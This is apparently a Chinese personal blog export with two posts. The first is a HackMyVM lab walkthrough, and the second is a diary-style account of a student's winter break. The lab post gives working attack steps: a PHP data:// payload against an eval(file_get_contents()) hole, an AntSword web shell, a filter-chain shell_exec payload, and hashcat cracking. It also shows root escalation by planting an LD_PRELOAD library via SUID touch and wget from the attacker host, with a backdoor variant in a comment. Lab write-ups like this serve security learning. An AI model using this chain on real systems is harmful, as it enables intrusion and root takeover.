<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tools.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flowermagic&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flowermagic&#x27;</span>] !== <span class="string">&quot;index.php&quot;</span> )</span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flowermagic&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这里执行post请求的<code>flowermagic</code>，但是前面有一个函数file_get_contents，这个函数是用来读取本地文件的，但是我们可以用data伪协议rce执行命令<br>data伪协议的使用方式是<code>data://text/plain;base64,+（命令的base64）</code><br><code>flowermagic=data://text/plain;base64,cGhwaW5mbygpOw==</code><br><img src="https://pic1.imgdb.cn/item/67b98304d0e0a243d401e3e2.png"><br>可以找到disable_functions看看哪些函数被ban了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">passthru,<span class="built_in">exec</span>,system,popen,<span class="built_in">chroot</span>,scandir,<span class="built_in">chgrp</span>,<span class="built_in">chown</span>,escapesh</span><br></pre></td></tr></table></figure></div>
<p>还是没有ban干净，shell_exec没有ban，这里有两种方式，一种是蚁剑连接，一种是用phpfilterchain，都学习一下<br>蚁剑：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> ZXZhbCgkX1BPU1RbMV0pOw== | <span class="built_in">base64</span> -d</span><br><span class="line"><span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]); </span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67b9860cd0e0a243d401e71e.png"><br>在请求信息这里加上一个http body 用data伪协议执行eval命令，然后链接密码再输入1<br>就可以连接上了，然后可以找到<code>.2024_12_25_project_web_login_password.bak</code>这个文件，最后都是用这个文件里的内容<br>filterchain：</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">┌──(root㉿kakeru)-[~/php_filter_chain_generator-main]</span></span><br><span class="line"><span class="language-xml">└─# python3 php_filter_chain_generator.py --chain &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">shell_exec</span>(\<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><span class="language-xml">&quot;</span></span><br></pre></td></tr></table></figure>
<p>这样就生成了一个filter链，这里里面就是用没有被ban的shell_exec函数，然后我们用get请求就能执行我们想要的命令了<br>但是我这里下载的是完整版的，这个方法就被ban了，不过也可以学习一下，反弹shell得到的shell的ps1不对，要用bash-p</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>通过刚才的两种方法，最后都是为了得到<code>.2024_12_25_project_web_login_password.bak</code>里的内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">pbkdf2</span>:sha256:<span class="number">50000</span>:flower:<span class="number">0916690</span>d7bc2f92a0e1f1640ce7ee22e988843323efb8c8e43064eafed92b028</span><br></pre></td></tr></table></figure></div>
<p>这是一个用pbkdf2 sha256加密的密码<br>搜索之后找到了用hashcat破解这个密码的方法<a href="https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256">0xBEN|Notes</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YAML"><figure class="iseeu highlight /yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">┌──(root㉿kakeru)-[~/tmp]</span></span><br><span class="line"><span class="string">└─#</span> <span class="string">hashcat</span> <span class="string">--hash-info</span> <span class="string">-m</span> <span class="number">10900</span></span><br><span class="line"><span class="string">hashcat</span> <span class="string">(v6.2.6)</span> <span class="string">starting</span> <span class="string">in</span> <span class="string">hash-info</span> <span class="string">mode</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Hash Info:</span></span><br><span class="line"><span class="string">==========</span></span><br><span class="line"></span><br><span class="line"><span class="string">Hash</span> <span class="string">mode</span> <span class="comment">#10900</span></span><br><span class="line">  <span class="attr">Name................:</span> <span class="string">PBKDF2-HMAC-SHA256</span></span><br><span class="line">  <span class="attr">Category............:</span> <span class="string">Generic</span> <span class="string">KDF</span></span><br><span class="line">  <span class="attr">Slow.Hash...........:</span> <span class="literal">Yes</span></span><br><span class="line">  <span class="attr">Password.Len.Min....:</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">Password.Len.Max....:</span> <span class="number">256</span></span><br><span class="line">  <span class="attr">Salt.Type...........:</span> <span class="string">Embedded</span></span><br><span class="line">  <span class="attr">Salt.Len.Min........:</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">Salt.Len.Max........:</span> <span class="number">256</span></span><br><span class="line">  <span class="attr">Kernel.Type(s)......:</span> <span class="string">pure</span></span><br><span class="line">  <span class="attr">Example.Hash.Format.:</span> <span class="string">plain</span></span><br><span class="line">  <span class="attr">Example.Hash........:</span> <span class="string">sha256:1000:NjI3MDM3:vVfavLQL9ZWjg8BUMq6/FB8FtpkIGWYk</span></span><br><span class="line">  <span class="attr">Example.Pass........:</span> <span class="string">hashcat</span></span><br><span class="line">  <span class="attr">Benchmark.Mask......:</span> <span class="string">?b?b?b?b?b?b?b</span></span><br><span class="line">  <span class="attr">Autodetect.Enabled..:</span> <span class="literal">Yes</span></span><br><span class="line">  <span class="attr">Self.Test.Enabled...:</span> <span class="literal">Yes</span></span><br><span class="line">  <span class="attr">Potfile.Enabled.....:</span> <span class="literal">Yes</span></span><br><span class="line">  <span class="attr">Custom.Plugin.......:</span> <span class="literal">No</span></span><br><span class="line">  <span class="attr">Plaintext.Encoding..:</span> <span class="string">ASCII,</span> <span class="string">HEX</span></span><br></pre></td></tr></table></figure></div>
<p>通过这个示例可以得出正确的hash格式是 <code>algorithm:iterations:salt:hash</code></p>
<p><code>0916690d7bc2f92a0e1f1640ce7ee22e988843323efb8c8e43064eafed92b028</code>这是一个16进制编码，我们要先用xxd还原然后用base64加密<br>flower也要base64的格式</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> -n <span class="string">&quot;0916690d7bc2f92a0e1f1640ce7ee22e988843323efb8c8e43064eafed92b028&quot;</span> | xxd -p -r | <span class="built_in">base64</span></span><br><span class="line">CRZpDXvC+SoOHxZAzn7iLpiIQzI++4yOQwZOr+2SsCg=</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> flower | <span class="built_in">base64</span>                                                                           </span><br><span class="line">Zmxvd2VyCg==</span><br></pre></td></tr></table></figure></div>
<p>所以最后可以破解的hash为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">sha256:</span><span class="number">50000</span><span class="symbol">:Zmxvd2VyCg</span><span class="symbol">:CRZpDXvC+SoOHxZAzn7iLpiIQzI++</span><span class="number">4</span>yOQwZOr+<span class="number">2</span>SsCg=</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# hashcat -a 0 -m 10900 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt -d 1 -w 3</span><br></pre></td></tr></table></figure></div>
<p>hashcat -m指定类型 -a 0 表示用字典攻击<br>得到一个密码<code>roseflower</code>,刚才用蚁剑看到家目录下面只有一个welcome用户，这个就是welcome的密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>bash -p</span><br><span class="line">welcome<span class="variable">@listen</span>:~<span class="variable">$ </span>sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="symbol">welcome:</span> </span><br><span class="line">Sorry, user welcome may not run sudo on listen.</span><br><span class="line">welcome<span class="variable">@listen</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/gpasswd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/passwd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/sudo</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chfn</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/umount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/touch</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br></pre></td></tr></table></figure></div>
<p>可以看到这里的touch有suid，我们就是要用这个touch提权<br>touch是一个创建文件的命令，这里有suid就是可以创建一个root的文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">welcome@listen:~$ touch a</span><br><span class="line">welcome@listen:~$ ls</span><br><span class="line">a  user.txt</span><br><span class="line">welcome@listen:~$ ls -al</span><br><span class="line">total 20</span><br><span class="line">drwx------<span class="number"> 2 </span>welcome welcome<span class="number"> 4096 </span>Feb<span class="number"> 22 </span>03:47 .</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>root    root     <span class="number"> 11 </span>Feb <span class="number"> 1 </span>11:10 .-</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>root    root   <span class="number"> 4096 </span>Jan <span class="number"> 7 </span>23:16 ..</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>root    root      <span class="number"> 0 </span>Feb<span class="number"> 22 </span>03:47 a</span><br><span class="line">-rw-------<span class="number"> 1 </span>welcome welcome  <span class="number"> 69 </span>Feb <span class="number"> 1 </span>07:13 .bash_history</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>root    root     <span class="number"> 33 </span>Jan <span class="number"> 7 </span>23:18 user.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>然后还有了解一个知识点<code>umask</code>，为什么会想到这个呢？因为现在有办法创造root的文件，而且是以当前用户的shell里面的，<br>我们可以控制umask从而修改文件的权限<br>umask的权限修改方式和chmod是相反的，chmod是直接给权限，umask是用666减去权限，比如umask是022 那创建之后的权限就是644<br>现在把umask改成0000 就可以创建一个root的并且权限是666的文件。<br>现在我们在本机追踪一下touch。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAMS"><figure class="iseeu highlight /gams"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# strace touch <span class="number">2</span>&gt;&amp;<span class="number">1</span> | grep -<span class="built_in">Pi</span> <span class="string">&quot;open|access|no such file&quot;</span></span><br><span class="line">faccessat(AT_FDCWD, <span class="string">&quot;/etc/ld.so.preload&quot;</span>, R_OK) = <span class="number">-1</span> ENOENT (<span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/etc/ld.so.cache&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">3</span></span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/lib/aarch64-linux-gnu/libc.so.6&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">3</span></span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/usr/lib/locale/locale-archive&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">3</span></span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/usr/share/locale/locale.alias&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">3</span></span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/usr/share/locale/en_US.UTF-8/LC_MESSAGES/coreutils.mo&quot;</span>, O_RDONLY) = <span class="number">-1</span> ENOENT (<span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/usr/share/locale/en_US.utf8/LC_MESSAGES/coreutils.mo&quot;</span>, O_RDONLY) = <span class="number">-1</span> ENOENT (<span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/usr/share/locale/en_US/LC_MESSAGES/coreutils.mo&quot;</span>, O_RDONLY) = <span class="number">-1</span> ENOENT (<span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/usr/share/locale/en.UTF-8/LC_MESSAGES/coreutils.mo&quot;</span>, O_RDONLY) = <span class="number">-1</span> ENOENT (<span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/usr/share/locale/en.utf8/LC_MESSAGES/coreutils.mo&quot;</span>, O_RDONLY) = <span class="number">-1</span> ENOENT (<span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/usr/share/locale/en/LC_MESSAGES/coreutils.mo&quot;</span>, O_RDONLY) = <span class="number">-1</span> ENOENT (<span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> directory)</span><br><span class="line">                                                                                                                  </span><br></pre></td></tr></table></figure></div>
<p>但是在靶机没有发现<code>/etc/ld.so.preload</code>这个文件，利用点就是这里了<br>该文件是 Linux 系统的全局配置文件，用于指定程序启动时<strong>强制优先加载的动态链接库（.so 文件）</strong>。与 <code>LD_PRELOAD</code> 环境变量不同，<code>/etc/ld.so.preload</code> 的影响是<strong>系统级的</strong>，会对所有用户和进程生效<br>该文件的行为类似于**<code>LD_PRELOAD</code>** ENV 变量，但也适用于 <strong>SUID 二进制文件</strong>。<br>如果您可以创建它或修改它，则只需在每个执行的二进制文件中<strong>加载的库中添加路径</strong>即可。<br>所以现在可以用touch创建一个ld.so.preload文件，然后我们写一个利用代码，编译好之后把文件地址进入ld.so.preload<br><img src="https://pic1.imgdb.cn/item/67b99244d0e0a243d401f25c.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">    <span class="comment">//后门写法-只用一次 system(&quot;cp /bin/bash /tmp/sh ; chmod +s /tmp/sh; rm /etc/ld.so.preload&quot;)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cd /tmp</span></span><br><span class="line"><span class="comment">//gcc -fPIC -shared -o pe.so pe.c -nostartfiles</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># x86_64-linux-gnu-gcc -fPIC -shared -o a.so a.c -nostartfiles</span></span><br><span class="line">                                                                                                                                                         </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># python3 -m http.server 80                                                                  </span></span><br><span class="line">Serving HTTP on 0.0.0.0 port<span class="number"> 80 </span>(http://0.0.0.0:80/) ...</span><br><span class="line"></span><br><span class="line">welcome@listen:/tmp$ wget 192.168.112.11/a.so</span><br><span class="line">--2025-02-22 04:10:46--  http://192.168.112.11/a.so</span><br><span class="line">Connecting to 192.168.112.11:80... connected.</span><br><span class="line">HTTP request sent, awaiting response...<span class="number"> 200 </span>OK</span><br><span class="line">Length:<span class="number"> 14144 </span>(14K) [application/octet-stream]</span><br><span class="line">Saving to: ‘a.so’</span><br><span class="line"></span><br><span class="line">a.so                                   100%[=========================================================================&gt;]  13.81K  --.-KB/s    in 0.001s  </span><br><span class="line"></span><br><span class="line">2025-02-22 04:10:47 (24.9 MB/s) - ‘a.so’ saved [14144/14144]</span><br><span class="line"></span><br><span class="line">welcome@listen:/tmp$ ls -al</span><br><span class="line">total 48</span><br><span class="line">drwxrwxrwt <span class="number"> 8 </span>root    root    <span class="number"> 4096 </span>Feb<span class="number"> 22 </span>04:10 .</span><br><span class="line">drwxr-xr-x<span class="number"> 18 </span>root    root    <span class="number"> 4096 </span>Jan <span class="number"> 7 </span>21:50 ..</span><br><span class="line">-rw-rw-rw- <span class="number"> 1 </span>root    root       <span class="number"> 0 </span>Feb<span class="number"> 22 </span>04:06 a</span><br><span class="line">-rw-rw-rw- <span class="number"> 1 </span>welcome welcome<span class="number"> 14144 </span>Feb<span class="number"> 22 </span>04:03 a.so</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Feb<span class="number"> 22 </span>02:33 .font-unix</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Feb<span class="number"> 22 </span>02:33 .ICE-unix</span><br><span class="line">drwx------ <span class="number"> 3 </span>root    root    <span class="number"> 4096 </span>Feb<span class="number"> 22 </span>02:34 systemd-private-ea7792e20f1b4a46a4474e8000aad4ea-systemd-timesyncd.service-uxH5C3</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Feb<span class="number"> 22 </span>02:33 .Test-unix</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Feb<span class="number"> 22 </span>02:33 .X11-unix</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Feb<span class="number"> 22 </span>02:33 .XIM-unix</span><br><span class="line">welcome@listen:/tmp$ echo /tmp/a.so &gt; /etc/ld.so.preload</span><br><span class="line">welcome@listen:/tmp$ touch aa</span><br><span class="line">root@listen:/tmp<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1001(welcome)</span><br></pre></td></tr></table></figure></div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学到用伪协议读文件，和data伪协议读取文件，然后学到了蚁剑的这种data伪协议读取文件的使用方式<br>了解了filterchain这个工具，学到了hashcat的使用方式<br>umask，strace命令学习 umask在可以创建文件的时候有用<br>&#x2F;etc&#x2F;ld.so.preload文件学习，之前了解过LD_PRELOAD和这个也有相似之处，然后了解了这种提权的方式和c语言代码</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>寒假总结</title>
    <url>/posts/62818.html</url>
    <content><![CDATA[<p>2025寒假总结</p>
<span id="more"></span>
<p>2月15号到学校了，我短短的寒假又结束了。这个寒假感觉还是挺充实的，至少不像前几个假期一样浑浑噩噩</p>
<h1 id="驾照到手"><a href="#驾照到手" class="headerlink" title="驾照到手"></a>驾照到手</h1><p>一回家就开始练科二了，一科一科没想到也赶在寒假结束之前拿到驾照了<br><img src="https://pic1.imgdb.cn/item/67b0b0d7d0e0a243d4ffb260.jpg"><br><img src="https://pic1.imgdb.cn/item/67b0b0e6d0e0a243d4ffb261.jpg"><br><img src="https://pic1.imgdb.cn/item/67b0b0f8d0e0a243d4ffb264.jpg"><br><img src="https://pic1.imgdb.cn/item/67b0b104d0e0a243d4ffb265.jpg"><br>在考科二的前一天还得了甲流发烧，还好最后还是有惊无险的通过了。驾照这座大山也是翻过了哈哈哈哈</p>
<h1 id="接触靶机和hackmyvm平台"><a href="#接触靶机和hackmyvm平台" class="headerlink" title="接触靶机和hackmyvm平台"></a>接触靶机和hackmyvm平台</h1><p>因为我本身是网安专业的，在放假之前也稍微把漏洞的类型看了一遍，在放假学车的时候刷到了群主的视频<br><img src="https://pic1.imgdb.cn/item/67b0b18dd0e0a243d4ffb272.png"><br>我靠，大数据还真是神奇，我看完一个视频之后觉得老有意思了，而且这个和我专业要学的内容一样。<br>前面学车在等的时间我就看群主最早的几个视频，就是vulnhub的DC系列靶机，然后自己回去之后跟着视频复现，做些笔记。<br>我自己以前是有学过一点linux的，不过都是Linux的入门的指令比如ls cat 这些最基本的，还是有好多知识都不知道，然后学过vim编辑器的使用。<br>在看完视频之后，自己装了kali，然后边学边记用到的linux，就有了我现在linux指令笔记和kali工具笔记，这些都是我在做靶机的时候一个个遇到的搜的，没想到现在已经也学了这么多了哈哈哈。<br>所以在看过DC系列9个靶机之后，我已经对linux常用的命令有了一个大致的理解，也算是入了门吧。<br>接下来就是接触到hmv这个平台了，这个平台真是个好平台啊，也是看群主的置顶视频里面我才知道的<br><img src="https://pic1.imgdb.cn/item/67b0b301d0e0a243d4ffb298.png"><br>这个平台和vulnhub差不多，就是一个提供靶机的平台，但是它一直在更新，而且有很强的反馈效果。在这里完成靶机都有相应的分数，然后有排名，和打游戏一样，还有段位，特别有意思。<br><img src="https://pic1.imgdb.cn/item/67b0b352d0e0a243d4ffb29f.png"><br><img src="https://pic1.imgdb.cn/item/67b0b379d0e0a243d4ffb2a3.png"><br>从easy做起，不会的就看视频，然后记起来，正反馈很强hhh<br>然后还开懦夫模式做了venus的lab，加强了linux的使用技巧，很好玩，一关关的，非常适合想学linux的人<br><img src="https://pic1.imgdb.cn/item/67b0b4c7d0e0a243d4ffb2c1.png"><br>后面有了博客之后，就是边做边写wp，还能有积分哈哈哈，最后也是混到了排名（虽然这个排名代表不了什么，一些大佬靶机做完了今年就没什么积分）<br>但是还是给我一些小小的成就感<br><img src="https://pic1.imgdb.cn/item/67b0b518d0e0a243d4ffb2cb.png"></p>
<h1 id="加入群聊"><a href="#加入群聊" class="headerlink" title="加入群聊"></a>加入群聊</h1><p>上面我说的群主就是这个hmv的群的群主啦<br>这个群主要就是打hmv的群，如果你也有打hmv或者觉得自己技术还可以欢迎加入，群号660930334<br>但是不推荐新手入群，因为新手如果不能做题拿到称号会被踢<br>然后群里有时候会出题目，大家解决之后一起分享做法，也很有意思<br><img src="https://pic1.imgdb.cn/item/67b0b6f2d0e0a243d4ffb31c.png"><br>然后群主也教会了很多，有点让我豁然开朗的感觉哈哈哈哈</p>
<h1 id="寒假对我而言最大的事"><a href="#寒假对我而言最大的事" class="headerlink" title="寒假对我而言最大的事"></a>寒假对我而言最大的事</h1><p>就是我的博客上线啦！！<br><img src="https://pic1.imgdb.cn/item/67b0b786d0e0a243d4ffb32b.png"><br>现在我已经对这个界面挺满意的了，还是偏向简约风<br>在之前就想搭建一个博客记录自己的笔记和学习心得了，终于在寒假的时候让我有时间搭建和部署了。<br>这个博客是用hexo搭建的，跟着视频和别人的博客还是很好搭建的，最难的还是选好主题之后的配置了。<br>这个配置让我在网上到处找资料然后修改，有些也不能直接用，最终花了两天达到了现在的效果，至少结果是好的<br>不过说起来，最直接的原因也是hmv这个平台，因为做完一个靶机之后可以上传自己的wp<br>在搭建完博客之后我就把之前的靶机的记录全整理上传了，也是有点小小的成就感了。<br>我自己在接触这方面一开始的时候遇到的问题就是我是mac的m芯片电脑，靶机一般都是运行x86系统的，所以我还折腾了mac怎么安装靶机，所以在我博客里面也有专门的一个分类记录我的mac靶机搭建方案<br>博客上线之后，我的内容还是挺单调的，基本都是靶机的复盘wp，后面就慢慢加了ctf，linux这些，以后应该还会上传编程的学习笔记。挺好<br><img src="https://pic1.imgdb.cn/item/67b0b8ead0e0a243d4ffb354.png"><br>在寒假我还是能保持一天一两更，开学了估计就没啥自己的时间了。。😑</p>
<h1 id="淘到好物"><a href="#淘到好物" class="headerlink" title="淘到好物"></a>淘到好物</h1><p><img src="https://pic1.imgdb.cn/item/67b0b948d0e0a243d4ffb35b.jpg"><br>这款键盘叫做keychron k3 max， 我经常在mac的好物分享上看到它，而且它是mac官方配图里面的键盘<br>而且这款的颜值也非常戳中我，最最重要的是，我之前的机械键盘特别重而且没有三模，一直都是有线使用，很麻烦<br>这款键盘是矮红轴的，很轻，而且三模，手感也特别好，声音也不大，打字久了也不累</p>
<p><img src="https://pic1.imgdb.cn/item/67b0ba68d0e0a243d4ffb398.jpg"><br>我用的很爽😌<br>然后和mac的键盘大小也差不多，我就可以直接夹在原来的键盘上面使用<br><img src="https://pic1.imgdb.cn/item/67b0ba99d0e0a243d4ffb3a9.jpg"><br>在家里我基本都在床上敲字，所以对我来说还是很重要的。<br>对了，还有一点，这个键盘对mac的支持很好，自带的键帽就是mac的配置，普通的键盘一般都是windows的，我接到mac之后还要改键位<br>这个键盘上面的功能键就是mac自带的功能键一样，非常好用</p>
<h1 id="回家就是好"><a href="#回家就是好" class="headerlink" title="回家就是好"></a>回家就是好</h1><p><img src="https://pic1.imgdb.cn/item/67b0bb2cd0e0a243d4ffb3c3.jpg"><br>上来一幅图，回家就是吃吃吃，一天吃个四五顿😂 夜宵也是嘎嘎吃<br>（在学校就没这福享了，只能乖乖吃预制菜了。。<br>然后就是我们福建人这边过年就是打牌搓麻将了，和家里人玩特别开心！<br><img src="https://pic1.imgdb.cn/item/67b0bb8fd0e0a243d4ffb3da.jpg"><br>要说回学校好的就是宿舍有我的显示器了，在家里小小的屏幕还是有点难受的<br><img src="https://pic1.imgdb.cn/item/67b0c076d0e0a243d4ffb455.jpg"><br>大屏就是爽！</p>
<h1 id="寒假实践"><a href="#寒假实践" class="headerlink" title="寒假实践"></a>寒假实践</h1><p>在上个寒假我报名了返校宣讲和感谢师恩，这次寒假我就报了感谢师恩，还是挺好的，也没啥压力，就是和同学回母校看看老师，不得不说，学校就是会在我们毕业之后有好多新东西。<br><img src="https://pic1.imgdb.cn/item/67b0bf71d0e0a243d4ffb43d.jpg"></p>
<h1 id="开学焦虑"><a href="#开学焦虑" class="headerlink" title="开学焦虑"></a>开学焦虑</h1><p>快开学了，先看看我的课表吧<br><img src="https://pic1.imgdb.cn/item/67b0bc74d0e0a243d4ffb3f2.png"><br>直接拉满了，能活下去吗（<br>我是转专业的，所以要补一些大一的课，还有好多课和现在大二的课冲突了，所以要代选，然后一起上<br>下学期除了课多，自己还有好多事啊，大创，比赛。。。<br>希望稳稳过这个学期吧，我的室友课比我还多<br>后面的概统一节课都去不了，准备开学前一天把概统速通了</p>
